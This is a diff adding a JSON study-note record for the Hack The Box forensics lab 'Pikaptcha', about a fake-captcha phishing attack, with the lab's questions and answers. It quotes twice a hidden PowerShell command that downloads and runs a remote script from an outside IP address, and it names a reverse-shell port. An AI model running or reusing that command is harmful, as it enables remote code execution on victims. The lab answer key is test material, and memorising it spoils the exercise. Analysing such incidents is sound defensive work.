@@ -1,0 +1,128 @@
+{
+  "id": "network analysis labs/pikaptcha (htb)",
+  "title": "Pikaptcha (HTB)",
+  "slug": "pikaptcha-htb",
+  "relPath": "Network Analysis Labs/Pikaptcha (HTB).md",
+  "level": "L2",
+  "curriculumLevelId": "l2",
+  "curriculumSectionId": "l2-attack-vectors",
+  "curriculumSectionTitle": "Advanced Attack Vectors & Internals",
+  "tags": [
+    "PowerShell",
+    "Windows",
+    "Phishing",
+    "Network",
+    "Web",
+    "Memory",
+    "C2"
+  ],
+  "mitre": [],
+  "parentId": "network analysis labs",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "network analysis labs"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "network analysis labs",
+      "title": "Network Analysis Labs",
+      "slug": "network-analysis-labs"
+    },
+    {
+      "id": "network analysis labs/pikaptcha (htb)",
+      "title": "Pikaptcha (HTB)",
+      "slug": "pikaptcha-htb"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "Pikaptcha (HTB)"
+    },
+    {
+      "level": 2,
+      "text": "Scenario"
+    },
+    {
+      "level": 3,
+      "text": "1- It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager."
+    },
+    {
+      "level": 3,
+      "text": "powershell -NOP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')\""
+    },
+    {
+      "level": 3,
+      "text": "2- At what time in UTC did the malicious payload execute?"
+    },
+    {
+      "level": 3,
+      "text": "2024-09-23 05:07:45"
+    },
+    {
+      "level": 3,
+      "text": "3- The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?"
+    },
+    {
+      "level": 3,
+      "text": "579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE"
+    },
+    {
+      "level": 3,
+      "text": "4- To which port did the reverse shell connect?"
+    },
+    {
+      "level": 3,
+      "text": "6969"
+    },
+    {
+      "level": 3,
+      "text": "5- For how many seconds was the reverse shell connection established between C2 and the victim's workstation?"
+    },
+    {
+      "level": 3,
+      "text": "403"
+    },
+    {
+      "level": 3,
+      "text": "6- Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?"
+    },
+    {
+      "level": 3,
+      "text": "stageClipboard"
+    }
+  ],
+  "overview": "Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing att",
+  "study": {
+    "overview": "Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing att",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "Pikaptcha (HTB)",
+      "Scenario",
+      "1- It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.",
+      "powershell -NOP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')\"",
+      "2- At what time in UTC did the malicious payload execute?",
+      "2024-09-23 05:07:45",
+      "3- The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?",
+      "579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE",
+      "4- To which port did the reverse shell connect?",
+      "6969",
+      "5- For how many seconds was the reverse shell connection established between C2 and the victim's workstation?",
+      "403"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [],
+    "tools": [
+      "PowerShell",
+      "Wireshark"
+    ],
+    "tips": []
+  }
+}
